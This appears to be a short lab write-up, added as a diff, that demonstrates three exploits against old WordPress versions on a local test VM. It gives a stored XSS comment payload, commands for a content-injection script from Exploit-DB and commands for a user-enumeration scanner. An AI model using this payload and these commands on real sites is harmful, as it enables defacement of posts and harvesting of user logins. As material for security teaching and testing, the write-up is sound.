@@ -1,0 +1,31 @@
+Types of exploits shown:
+
+XSS
+Unauthorized Content Injection
+User Enumeration
+
+XSS Source
+https://klikki.fi/adv/wordpress2.html
+Affected version: 4.2
+XSS code used:
+<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+Expand the AAAAAA's in a text file to get the size over 64kb and then paste the code in a comment.
+
+Unauthorized Content Injection
+Source: https://www.exploit-db.com/exploits/41223/
+Affected Version: 4.7
+Download the python file and create a text file to be injected.
+Steps to follow in the root command line:
+# python 41223.py http://wpdistillery.vm/
+  --Will output post IDs and links
+# python 41223.py http://wpdistillery.vm/ "Post #" 'Text file to be injected'
+  --Will update the specified post number and show the desired text
+  
+User Enumeration
+Source: https://github.com/KyxRecon/WordPress-Users-Scanner
+Affected Version: 4.7
+Exploit steps:
+Create a few extra users by enabling registration and then registering fake accounts on the Wordpress website
+Download the wpscanner.py file
+In the directory containing the python file run the code: python wpscanner.py -s http://wpdistillery.vm/ -n 50
+The code will then scan the website and return the login name and user's name in a graphical index.
